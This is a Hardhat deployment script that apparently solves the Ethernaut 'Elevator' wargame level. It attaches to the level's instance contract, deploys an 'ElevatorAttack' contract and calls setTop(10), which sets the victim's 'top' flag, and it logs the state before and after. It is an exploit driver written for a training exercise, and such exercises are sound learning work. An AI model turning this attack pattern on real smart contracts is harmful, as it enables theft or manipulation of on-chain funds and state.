const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("Elevator");
  const victim = await Victim.attach(
    "0x1382d5a1183FD8ba0c068fd4DeFed79b7ed8a6C2" // This is the contract address that you get from starting your instance
  );

  // Check what the current value of top and floor are
  const value1 = await victim.top();
  console.log("The current value of top is ", value1);
  const floor1 = await victim.floor();
  console.log("The current floor is ", floor1.toString());

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("ElevatorAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0x1382d5a1183FD8ba0c068fd4DeFed79b7ed8a6C2"
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Call setTop function from attack contract
  const attack = await contract.setTop(10); // this will call the goTo function from Elevator contract
  await attack.wait(1);

  // Verify that the value top has changed
  const value2 = await victim.top();
  console.log("The current value of top is ", value2);
  const floor2 = await victim.floor();
  console.log("The current floor is ", floor2.toString());
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
